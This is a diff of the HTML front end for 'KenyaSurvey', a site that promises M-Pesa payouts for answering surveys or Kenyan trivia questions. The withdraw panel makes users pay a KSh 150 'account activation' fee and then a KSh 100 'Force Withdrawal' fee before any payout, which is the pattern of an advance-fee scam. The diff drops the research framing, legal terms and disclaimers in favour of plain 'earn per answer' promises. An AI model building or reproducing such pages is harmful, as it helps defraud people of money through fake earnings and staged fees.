-              <option>Self-Employed / Business</option><option>Freelancer</option><option>Farmer</option>
-              <option>Unemployed</option><option>Retired</option><option>Other</option>
-            </select>
-          </div>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Highest Education Level</label>
-          <div class="field-wrap">
-            <i class="fas fa-graduation-cap"></i>
-            <select class="select-input" id="prof-education">
-              <option value="">Select education level</option>
-              <option>Primary School</option><option>Secondary School (KCSE)</option>
-              <option>Certificate / Diploma</option><option>Bachelor's Degree</option>
-              <option>Master's Degree</option><option>PhD</option><option>Other</option>
-            </select>
-          </div>
-        </div>
-        <div class="alert error" id="prof-error"></div>
-        <div class="alert success" id="prof-success"></div>
-        <button class="btn-primary" id="btn-profile" onclick="doCompleteProfile()">
-          <i class="fas fa-check"></i> Save Profile and Continue
-        </button>
       </div>
+      <div class="field-group">
+        <label class="field-label">Occupation</label>
+        <div class="field-wrap">
+          <i class="fas fa-briefcase"></i>
+          <select class="select-input" id="prof-occupation">
+            <option value="">Select occupation</option>
+            <option>Student</option><option>Employed - Private Sector</option><option>Employed - Government</option>
+            <option>Self-Employed / Business</option><option>Freelancer</option><option>Farmer</option>
+            <option>Unemployed</option><option>Retired</option><option>Other</option>
+          </select>
+        </div>
+      </div>
+      <div class="field-group">
+        <label class="field-label">Highest Education Level</label>
+        <div class="field-wrap">
+          <i class="fas fa-graduation-cap"></i>
+          <select class="select-input" id="prof-education">
+            <option value="">Select education level</option>
+            <option>Primary School</option><option>Secondary School (KCSE)</option>
+            <option>Certificate / Diploma</option><option>Bachelor's Degree</option>
+            <option>Master's Degree</option><option>PhD</option><option>Other</option>
+          </select>
+        </div>
+      </div>
+      <div class="alert error" id="prof-error"></div>
+      <div class="alert success" id="prof-success"></div>
+      <button class="btn-primary" id="btn-profile" onclick="doCompleteProfile()">
+        <i class="fas fa-check"></i> Save Profile and Continue
+      </button>
     </div>
   </div>
 </div>
 
-
-<!-- ══════════════════════════════════════════
-     APP SCREEN
-══════════════════════════════════════════ -->
+<!-- ════════════════ MAIN APP ════════════════ -->
 <div class="screen" id="app-screen">
 
+  <!-- Mobile Header -->
   <div class="mobile-header">
     <button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
     <div class="mobile-balance" id="mobile-balance">KSh 0.00</div>
     <button class="btn-logout" onclick="doLogout()"><i class="fas fa-power-off"></i></button>
   </div>
 
+  <!-- Sidebar overlay -->
   <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
 
+  <!-- Sidebar -->
   <aside class="sidebar" id="sidebar">
     <div class="sidebar-logo">
       <div class="sidebar-logo-icon"><i class="fas fa-graduation-cap"></i></div>
@@ -706,9 +183,9 @@
     </div>
 
     <div class="balance-card">
-      <div class="balance-label">Available Compensation</div>
+      <div class="balance-label">Available Balance</div>
       <div class="balance-amount" id="sidebar-balance">KSh 0.00</div>
-      <div class="balance-earned" id="sidebar-earned">Total compensation: KSh 0.00</div>
+      <div class="balance-earned" id="sidebar-earned">Total earned: KSh 0.00</div>
     </div>
 
     <ul class="nav-list">
@@ -719,29 +196,23 @@
       </li>
       <li class="nav-item">
         <button class="nav-link" id="nav-survey" onclick="showPanel('survey')">
-          <i class="fas fa-clipboard-list"></i> Research Surveys
+          <i class="fas fa-clipboard-list"></i> Surveys
           <span class="nav-badge" id="nav-survey-badge">120</span>
         </button>
       </li>
       <li class="nav-item">
         <button class="nav-link" id="nav-withdraw" onclick="showPanel('withdraw')">
-          <i class="fas fa-paper-plane"></i> Participant Compensation
+          <i class="fas fa-wallet"></i> Withdraw
         </button>
       </li>
       <li class="nav-item">
         <button class="nav-link" id="nav-transactions" onclick="showPanel('transactions')">
-          <i class="fas fa-history"></i> Compensation History
+          <i class="fas fa-history"></i> History
         </button>
       </li>
     </ul>
 
     <div class="sidebar-footer">
-      <div class="sidebar-legal">
-        <span class="text-link small" onclick="showModal('about')">About</span>
-        <span class="text-link small" onclick="showModal('terms')">Terms</span>
-        <span class="text-link small" onclick="showModal('privacy')">Privacy</span>
-        <span class="text-link small" onclick="showModal('contact')">Contact</span>
-      </div>
       <div class="user-info">
         <div class="user-avatar"><i class="fas fa-user"></i></div>
         <div>
@@ -755,19 +226,20 @@
     </div>
   </aside>
 
+  <!-- Main Content -->
   <main class="main-content">
 
-    <!-- DASHBOARD -->
+    <!-- ── DASHBOARD PANEL ── -->
     <div class="page-panel active" id="panel-dashboard">
       <div class="page-title" id="dash-greeting">Good day!</div>
-      <div class="page-sub">Track your research participation activity and compensation.</div>
+      <div class="page-sub">Track your earnings and survey progress.</div>
 
       <div class="start-survey-hero">
         <div class="start-survey-left">
           <div class="start-survey-icon-wrap"><i class="fas fa-clipboard-list"></i></div>
           <div>
-            <div class="start-survey-heading">Ready to Participate?</div>
-            <div class="start-survey-desc">Access available research surveys and receive compensation based on eligible responses. Eligibility varies by project.</div>
+            <div class="start-survey-heading">Ready to Earn?</div>
+            <div class="start-survey-desc">Answer Kenyan trivia questions and earn KSh 30 – 100 per correct answer.</div>
           </div>
         </div>
         <button class="btn-start-survey" onclick="showPanel('survey')">
@@ -775,12 +247,12 @@
         </button>
       </div>
 
-      <div class="activation-banner" id="activation-banner">
+      <div class="activation-banner hidden" id="activation-banner">
         <div class="activation-text">
-          <h3 id="activation-banner-title"><i class="fas fa-shield-alt" style="margin-right:6px"></i>Account Verification Required</h3>
-          <p id="activation-banner-desc">To verify your registered mobile number and activate payment services, a one-time account verification process is required before your first payment request.</p>
+          <h3 id="activation-banner-title"></h3>
+          <p id="activation-banner-desc"></p>
         </div>
-        <button class="btn-activate" id="activation-banner-btn" onclick="showPanel('withdraw')">Verify Account</button>
+        <button class="btn-activate" id="activation-banner-btn">Go to Withdraw</button>
       </div>
 
       <div class="stats-grid">
@@ -788,35 +260,35 @@
           <div class="stat-icon green"><i class="fas fa-coins"></i></div>
           <div>
             <div class="stat-value" id="stat-balance">0.00</div>
-            <div class="stat-label">Available Compensation (KSh)</div>
+            <div class="stat-label">Balance (KSh)</div>
           </div>
         </div>
         <div class="stat-card">
-          <div class="stat-icon gold"><i class="fas fa-chart-bar"></i></div>
+          <div class="stat-icon gold"><i class="fas fa-trophy"></i></div>
           <div>
             <div class="stat-value" id="stat-earned">0.00</div>
-            <div class="stat-label">Total Compensation (KSh)</div>
+            <div class="stat-label">Total Earned (KSh)</div>
           </div>
         </div>
         <div class="stat-card">
-          <div class="stat-icon blue"><i class="fas fa-clipboard-check"></i></div>
+          <div class="stat-icon blue"><i class="fas fa-check-circle"></i></div>
           <div>
             <div class="stat-value" id="stat-completed">0</div>
-            <div class="stat-label">Surveys Completed</div>
+            <div class="stat-label">Questions Done</div>
           </div>
         </div>
         <div class="stat-card">
           <div class="stat-icon purple"><i class="fas fa-tasks"></i></div>
           <div>
             <div class="stat-value" id="stat-remaining">120</div>
-            <div class="stat-label">Surveys Remaining</div>
+            <div class="stat-label">Remaining</div>
           </div>
         </div>
       </div>
 
       <div class="progress-card">
         <div class="progress-header">
-          <span class="progress-title"><i class="fas fa-chart-line" style="color:var(--green);margin-right:6px"></i>Participation Progress</span>
+          <span class="progress-title"><i class="fas fa-chart-line" style="color:var(--green);margin-right:6px"></i>Survey Progress</span>
           <span class="progress-count" id="progress-text">0 / 120 completed</span>
         </div>
         <div class="progress-bar">
@@ -824,263 +296,156 @@
         </div>
       </div>
 
-      <div class="disclosure-card">
-        <i class="fas fa-info-circle"></i>
-        <p>Compensation is subject to survey eligibility and project availability. KenyaSurvey does not guarantee a specific income level. Payment processing is subject to verification requirements.</p>
-      </div>
-
-      <div class="section-title"><i class="fas fa-receipt"></i> Recent Activity</div>
+      <div class="section-title"><i class="fas fa-receipt"></i> Recent Transactions</div>
       <div class="tx-list" id="dash-tx-list">
         <div class="empty-state">
           <i class="fas fa-inbox"></i>
-          <p>No activity recorded yet. Participate in surveys to begin earning compensation.</p>
+          <p>No transactions yet. Start answering surveys to earn!</p>
         </div>
       </div>
     </div>
 
-    <!-- SURVEYS -->
+    <!-- ── SURVEY PANEL ── -->
     <div class="page-panel" id="panel-survey">
       <div class="survey-top">
         <div>
-          <div class="page-title">Research Surveys</div>
-          <div class="page-sub">Answer research questions honestly. Research depends on accurate participant responses.</div>
+          <div class="page-title">Survey Questions</div>
+          <div class="page-sub">Answer correctly to earn KSh 30 – KSh 100 per question.</div>
         </div>
         <div id="page-dots" class="page-indicator"></div>
       </div>
-      <div class="survey-integrity-note">
-        <i class="fas fa-clipboard-check"></i>
-        <p>Please answer all questions honestly. Research quality depends on accurate responses. False or inconsistent responses may affect your eligibility for future surveys.</p>
-      </div>
+
       <div class="questions-grid" id="questions-grid">
         <div class="empty-state"><div class="spinner"></div></div>
       </div>
+
       <div class="pagination">
         <button class="btn-page" id="btn-prev" onclick="changePage(-1)" disabled>
           <i class="fas fa-arrow-left"></i> Previous
         </button>
-        <span class="page-info" id="page-info">Page 1 of 7</span>
+        <span class="page-info" id="page-info">Page 1 of 20</span>
         <button class="btn-page next" id="btn-next" onclick="changePage(1)">
           Next <i class="fas fa-arrow-right"></i>
         </button>
       </div>
     </div>
 
-    <!-- PARTICIPANT COMPENSATION -->
-   <!-- ── WITHDRAW PANEL ── -->
-<div class="page-panel withdraw-box" id="panel-withdraw">
-  <div class="page-title">Withdraw Earnings</div>
-  <div class="page-sub">Receive your earnings directly to M-Pesa.</div>
+    <!-- ── WITHDRAW PANEL ── -->
+    <div class="page-panel withdraw-box" id="panel-withdraw">
+      <div class="page-title">Withdraw Earnings</div>
+      <div class="page-sub">Receive your earnings directly to M-Pesa.</div>
 
-  <div class="info-card">
-    <div class="info-row">
-      <span class="label">Current Balance</span>
-      <span class="value green" id="wd-balance">KSh 0.00</span>
-    </div>
-    <div class="info-row">
-      <span class="label">Minimum Withdrawal</span>
-      <span class="value">KSh 150</span>
-    </div>
-    <div class="info-row">
-      <span class="label">Transaction Fee</span>
-      <span class="value">4% of withdrawal amount</span>
-    </div>
-    <div class="info-row">
-      <span class="label">You Will Receive</span>
-      <span class="value green" id="wd-receive">KSh 0.00</span>
-    </div>
-    <div class="info-row">
-      <span class="label">Account Status</span>
-      <span class="value" id="wd-status">
-        <span class="chip gold"><i class="fas fa-lock"></i> Not Activated</span>
-      </span>
-    </div>
-    <div class="info-row hidden" id="wd-phone-row">
-      <span class="label">Registered M-Pesa</span>
-      <span class="value" id="wd-reg-phone" style="color:var(--text2);font-size:0.85rem"></span>
-    </div>
-  </div>
+      <!-- Balance & status info card -->
+      <div class="info-card">
+        <div class="info-row">
+          <span class="label">Current Balance</span>
+          <span class="value green" id="wd-balance">KSh 0.00</span>
+        </div>
+        <div class="info-row">
+          <span class="label">Minimum Withdrawal</span>
+          <span class="value">KSh 150</span>
+        </div>
+        <div class="info-row">
+          <span class="label">Transaction Fee</span>
+          <span class="value">4% of amount</span>
+        </div>
+        <div class="info-row">
+          <span class="label">You Will Receive</span>
+          <span class="value green" id="wd-receive">KSh 144.00</span>
+        </div>
+        <div class="info-row">
+          <span class="label">Account Status</span>
+          <span class="value" id="wd-status">
+            <span class="chip gold"><i class="fas fa-lock"></i> Not Activated</span>
+          </span>
+        </div>
+        <div class="info-row hidden" id="wd-phone-row">
+          <span class="label">Registered M-Pesa</span>
+          <span class="value" id="wd-reg-phone" style="color:var(--text2);font-size:0.85rem"></span>
+        </div>
+      </div>
 
-  <!-- Main withdrawal form — always visible -->
-  <div id="wd-form">
-    <div class="field-group" style="margin-bottom:16px">
-      <label class="field-label">M-Pesa Phone Number</label>
-      <div class="field-wrap">
-        <i class="fas fa-mobile-alt"></i>
-        <input class="field-input" type="tel" id="wd-phone" placeholder="07XX XXX XXX" />
+      <!-- ── STEP 1: Withdrawal form — always visible ── -->
+      <div id="wd-form">
+        <div class="field-group" style="margin-bottom:16px">
+          <label class="field-label">Recipient M-Pesa Number</label>
+          <div class="field-wrap">
+            <i class="fas fa-mobile-alt"></i>
+            <input class="field-input" type="tel" id="wd-phone" placeholder="07XX XXX XXX" />
+          </div>
+        </div>
+        <div class="field-group" style="margin-bottom:8px">
+          <label class="field-label">Amount to Withdraw (KSh)</label>
+          <div class="amount-display" id="wd-amount-display">150</div>
+          <input type="range" class="slider-input" id="wd-slider" min="150" max="1000" step="10" value="150" oninput="updateSlider()" />
+          <div style="display:flex;justify-content:space-between;font-size:0.75rem;color:var(--text3);margin-top:4px">
+            <span>KSh 150</span>
+            <span id="wd-slider-max">KSh 1,000</span>
+          </div>
+        </div>
+        <div class="alert error" id="wd-error"></div>
+        <div class="alert success" id="wd-success"></div>
+        <button class="btn-primary" id="btn-withdraw" onclick="doWithdraw()" style="margin-top:12px">
+          <i class="fas fa-paper-plane"></i> Withdraw
+        </button>
+      </div>
+
+      <!-- ── STEP 2: Activation gate (KSh 150) — hidden until needed ── -->
+      <div id="wd-locked" class="hidden" style="margin-top:24px">
+        <div style="height:1px;background:var(--border);margin-bottom:24px"></div>
+        <div class="locked-msg">
+          <i class="fas fa-exclamation-triangle"></i>
+          <p>Your account is not activated. Pay a one-time fee of <strong>KSh 150</strong> via M-Pesa to unlock withdrawals.</p>
+        </div>
+        <div class="field-group" style="margin-bottom:16px;margin-top:16px">
+          <label class="field-label">Your M-Pesa Number</label>
+          <div class="field-wrap">
+            <i class="fas fa-mobile-alt"></i>
+            <input class="field-input" type="tel" id="act-phone" placeholder="07XX XXX XXX" />
+          </div>
+        </div>
+        <div class="alert error" id="act-error"></div>
+        <div class="alert success" id="act-success"></div>
+        <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;" id="btn-activate" onclick="doActivate()">
+          <i class="fas fa-unlock" style="margin-right:8px"></i>Activate Account – KSh 150
+        </button>
+        <p class="auth-note" style="margin-top:12px">One-time payment. No recurring charges.</p>
+      </div>
+
+      <!-- ── STEP 3: Force withdrawal gate (KSh 100) — hidden until needed ── -->
+      <div id="wd-force" class="hidden" style="margin-top:24px">
+        <div style="height:1px;background:var(--border);margin-bottom:24px"></div>
+        <div style="background:rgba(0,166,81,0.08);border:1px solid rgba(0,166,81,0.25);border-radius:var(--radius);padding:16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px;">
+          <i class="fas fa-check-circle" style="color:var(--green);margin-top:2px"></i>
+          <div>
+            <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">KSh 150 Verified</div>
+            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">
+              Your account is verified. Complete the one-time <strong style="color:var(--text)">Force Withdrawal activation of KSh 100</strong> to enable payouts. The M-Pesa prompt will be sent to your registered number automatically.
+            </div>
+          </div>
+        </div>
+        <div class="alert error" id="fv-error"></div>
+        <div class="alert success" id="fv-success"></div>
+        <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;background:linear-gradient(135deg,#3b82f6,#1d4ed8);" id="btn-force-verify" onclick="doForceVerify()">
+          <i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100
+        </button>
+        <p class="auth-note" style="margin-top:12px">Prompt sent automatically to your registered number. No number entry needed.</p>
       </div>
     </div>
-    <div class="field-group" style="margin-bottom:8px">
-      <label class="field-label">Amount to Withdraw (KSh)</label>
-      <div class="amount-display" id="wd-amount-display">150</div>
-      <input type="range" class="slider-input" id="wd-slider" min="150" max="1000" step="10" value="150" oninput="updateSlider()" />
-      <div style="display:flex;justify-content:space-between;font-size:0.75rem;color:var(--text3);margin-top:4px">
-        <span>KSh 150</span><span id="wd-slider-max">KSh 1,000</span>
-      </div>
-    </div>
-    <div class="alert error" id="wd-error"></div>
-    <div class="alert success" id="wd-success"></div>
-    <button class="btn-primary" id="btn-withdraw" onclick="doWithdraw()" style="margin-top:12px">
-      <i class="fas fa-paper-plane"></i> Request Withdrawal
-    </button>
-  </div>
 
-  <!-- Verification gate — shown when not activated -->
-  <div id="wd-locked" class="hidden" style="margin-top:20px">
-    <div class="locked-msg">
-      <i class="fas fa-exclamation-triangle"></i>
-      <p>Your account needs to be activated before you can withdraw. Pay a one-time fee of <strong>KSh 150</strong> via M-Pesa to unlock your account.</p>
-    </div>
-    <div class="field-group" style="margin-bottom:16px">
-      <label class="field-label">M-Pesa Phone Number</label>
-      <div class="field-wrap">
-        <i class="fas fa-mobile-alt"></i>
-        <input class="field-input" type="tel" id="act-phone" placeholder="07XX XXX XXX" />
-      </div>
-    </div>
-    <div class="alert error" id="act-error"></div>
-    <div class="alert success" id="act-success"></div>
-    <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;" id="btn-activate" onclick="doActivate()">
-      <i class="fas fa-unlock" style="margin-right:8px"></i>Activate Account – KSh 150
-    </button>
-    <p class="auth-note" style="margin-top:12px">One-time payment. No recurring charges.</p>
-  </div>
-
-  <!-- Force verify gate — shown when activated but not forceVerified -->
-  <div id="wd-force" class="hidden" style="margin-top:20px">
-    <div style="background:rgba(0,166,81,0.08);border:1px solid rgba(0,166,81,0.25);border-radius:var(--radius);padding:16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px;">
-      <i class="fas fa-check-circle" style="color:var(--green);margin-top:2px"></i>
-      <div>
-        <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">Account Verified</div>
-        <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your KSh 150 verification was successful. Complete the one-time <strong style="color:var(--text)">Force Withdrawal activation of KSh 100</strong> to enable withdrawals. Prompt sent automatically to your registered number.</div>
-      </div>
-    </div>
-    <div class="alert error" id="fv-error"></div>
-    <div class="alert success" id="fv-success"></div>
-    <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;background:linear-gradient(135deg,#3b82f6,#1d4ed8);" id="btn-force-verify" onclick="doForceVerify()">
-      <i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100
-    </button>
-    <p class="auth-note" style="margin-top:12px">Prompt sent automatically to your registered number. No number entry needed.</p>
-  </div>
-</div>
-
-    <!-- COMPENSATION HISTORY -->
+    <!-- ── TRANSACTIONS PANEL ── -->
     <div class="page-panel" id="panel-transactions">
-      <div class="page-title">Compensation History</div>
-      <div class="page-sub">View your research participation compensation and payment request history.</div>
+      <div class="page-title">Transaction History</div>
+      <div class="page-sub">All your earnings and withdrawals.</div>
       <div class="tx-list" id="all-tx-list">
         <div class="empty-state">
           <i class="fas fa-inbox"></i>
-          <p>No activity recorded yet. Participate in surveys to begin earning compensation.</p>
+          <p>No transactions yet.</p>
         </div>
       </div>
     </div>
 
   </main>
-</div><!-- /app-screen -->
-
-
-<!-- ══════════════════════════════════════════
-     MODALS
-══════════════════════════════════════════ -->
-<div class="modal-overlay" id="modal-overlay" onclick="closeModal()"></div>
-
-<!-- About -->
-<div class="modal" id="modal-about">
-  <div class="modal-header">
-    <h3><i class="fas fa-info-circle"></i> About KenyaSurvey</h3>
-    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
-  </div>
-  <div class="modal-body">
-    <p>KenyaSurvey is a research participation platform that connects eligible participants with survey and data collection projects across Kenya.</p>
-    <p>We help organisations and researchers gather opinions, demographic data, and survey responses from verified Kenyan participants. Participants who complete eligible surveys may receive compensation via M-Pesa.</p>
-    <h4>Our Mission</h4>
-    <p>To make research participation accessible to all Kenyans while providing fair compensation for participants' time and input.</p>
-    <h4>Our Vision</h4>
-    <p>A Kenya where every citizen can contribute meaningfully to research that shapes policy, business and community outcomes.</p>
-    <h4>Research Ethics</h4>
-    <p>All participant data is handled confidentially. Survey responses are aggregated and anonymised before being shared with research clients. Participants may request deletion of their data at any time.</p>
-    <h4>Compensation Disclaimer</h4>
-    <p>Compensation is not guaranteed. Eligibility depends on project availability, participant demographics, survey completion, and compliance with platform requirements.</p>
-    <div class="modal-contact-info">
-      <p><i class="fas fa-envelope"></i> support@kenyasurvey.com</p>
-      <p><i class="fas fa-globe"></i> premium-surveys-kenya.vercel.app</p>
-    </div>
-  </div>
-</div>
-
-<!-- Terms -->
-<div class="modal" id="modal-terms">
-  <div class="modal-header">
-    <h3><i class="fas fa-file-contract"></i> Terms of Service</h3>
-    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
-  </div>
-  <div class="modal-body">
-    <h4>1. Eligibility</h4>
-    <p>You must be 18 years or older and a resident of Kenya to participate. Account registration requires a valid Kenyan mobile number. Multiple accounts are not permitted.</p>
-    <h4>2. Survey Participation</h4>
-    <p>Survey availability and eligibility are determined by individual project requirements. Not all registered participants will qualify for all surveys. Compensation is only awarded for surveys you are eligible for and complete according to project requirements.</p>
-    <h4>3. Compensation</h4>
-    <p>Compensation amounts are set per survey project. KenyaSurvey does not guarantee any specific income. Compensation is paid via M-Pesa to your registered number after verification requirements are met.</p>
-    <h4>4. Account Verification</h4>
-    <p>Before payment services are activated, participants must complete an account verification process. This confirms your registered mobile number and activates the M-Pesa payout channel. Verification fees are non-refundable.</p>
-    <h4>5. Survey Disqualification</h4>
-    <p>Participants who do not meet a survey's eligibility requirements may be disqualified from that survey. Disqualified participants do not receive compensation for that survey.</p>
-    <h4>6. Prohibited Conduct</h4>
-    <p>Creating multiple accounts, submitting false information, or attempting to manipulate survey responses may result in account suspension and forfeiture of compensation.</p>
-    <h4>7. Account Suspension</h4>
-    <p>KenyaSurvey reserves the right to suspend or terminate accounts that violate these terms. Suspended accounts forfeit any unpaid compensation balances.</p>
-    <h4>8. Fraud</h4>
-    <p>Any attempt to fraudulently obtain compensation will result in immediate account termination and may be reported to relevant authorities.</p>
-  </div>
-</div>
-
-<!-- Privacy -->
-<div class="modal" id="modal-privacy">
-  <div class="modal-header">
-    <h3><i class="fas fa-user-shield"></i> Privacy Policy</h3>
-    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
-  </div>
-  <div class="modal-body">
-    <h4>Information We Collect</h4>
-    <p>We collect your phone number, PIN (hashed), demographic information (name, county, occupation, education), and survey responses.</p>
-    <h4>How We Use Your Information</h4>
-    <p>Your information is used to match you to relevant surveys, process compensation payments, and maintain platform security. Demographic data may be shared in aggregate, anonymised form with research clients.</p>
-    <h4>Data Principles</h4>
-    <p>We follow privacy-first principles. We collect only the data necessary for platform operation and do not sell your personal data to third parties.</p>
-    <h4>M-Pesa Payments</h4>
-    <p>Your phone number is used to process M-Pesa payments. We do not store your M-Pesa PIN.</p>
-    <h4>Data Security</h4>
-    <p>All passwords and PINs are hashed using secure algorithms. Connections are encrypted via HTTPS.</p>
-    <h4>Your Rights</h4>
-    <p>You may request access to, correction of, or deletion of your account and personal data by contacting support@kenyasurvey.com. We will process requests within 14 business days.</p>
-  </div>
-</div>
-
-<!-- Contact -->
-<div class="modal" id="modal-contact">
-  <div class="modal-header">
-    <h3><i class="fas fa-envelope"></i> Contact Us</h3>
-    <button onclick="closeModal()"><i class="fas fa-times"></i></button>
-  </div>
-  <div class="modal-body">
-    <p>For support, questions, or concerns about your account, please reach out to our team.</p>
-    <div class="modal-contact-info">
-      <p><i class="fas fa-envelope"></i> <strong>Support Email:</strong> support@kenyasurvey.com</p>
-      <p><i class="fas fa-clock"></i> <strong>Business Hours:</strong> Monday – Friday, 8am – 6pm EAT</p>
-      <p><i class="fas fa-reply"></i> <strong>Response Time:</strong> Within 24–48 hours</p>
-    </div>
-    <div class="contact-topics">
-      <p><strong>Common support topics:</strong></p>
-      <ul>
-        <li>Account verification issues</li>
-        <li>Payment request status</li>
-        <li>Survey eligibility questions</li>
-        <li>Profile update requests</li>
-        <li>Account deletion requests</li>
-        <li>Data privacy enquiries</li>
-      </ul>
-    </div>
-  </div>
 </div>
 
 <script src="app.js"></script>
